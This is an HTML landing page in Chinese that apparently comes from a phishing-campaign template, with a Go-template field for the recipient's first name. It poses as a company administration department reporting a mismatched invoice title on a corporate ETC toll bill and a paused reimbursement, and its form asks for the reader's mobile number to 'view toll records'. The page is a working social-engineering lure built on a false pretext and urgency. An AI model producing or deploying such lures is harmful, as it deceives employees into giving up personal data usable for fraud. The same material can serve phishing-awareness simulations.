<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>企业 ETC 账单</title>
  <style>
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #f0f9ff; color: #1f2937; }
    header { background: #075985; color: #fff; padding: 18px 20px; }
    header h1 { margin: 0; font-size: 18px; font-weight: 600; }
    header p { margin: 6px 0 0; font-size: 13px; opacity: .92; }
    main { max-width: 420px; margin: 24px auto; padding: 0 16px 32px; }
    .card { background: #fff; border-radius: 8px; padding: 22px 20px; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
    .notice { background: #f0f9ff; border-left: 3px solid #0284c7; padding: 10px 12px; font-size: 13px; color: #475569; margin: 0 0 8px; }
    label { display: block; margin: 14px 0 6px; font-size: 13px; }
    input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #d9d9d9; border-radius: 4px; font-size: 14px; }
    button { margin-top: 18px; width: 100%; padding: 12px; background: #0369a1; color: #fff; border: 0; border-radius: 4px; font-size: 15px; cursor: pointer; }
    footer { margin-top: 14px; font-size: 12px; color: #94a3b8; text-align: center; }
  </style>
</head>
<body>
  <header>
    <h1>行政管理部</h1>
    <p>企业 ETC 通行费待核对</p>
  </header>
  <main>
    <div class="card">
      <p>{{if .FirstName}}{{.FirstName}}{{else}}同事{{end}}，请核对这张账单的发票抬头。</p>
      <div class="notice">对公账户有一笔通行费的抬头与公司名称不一致，报销已暂停。</div>
      <form method="POST">
        <label for="phone">手机号</label>
        <input id="phone" name="phone" type="tel" inputmode="numeric" placeholder="11 位手机号" required>
        <button type="submit">查看通行记录</button>
      </form>
    </div>
    <footer>行政管理部 · 车辆与通行</footer>
  </main>
</body>
</html>
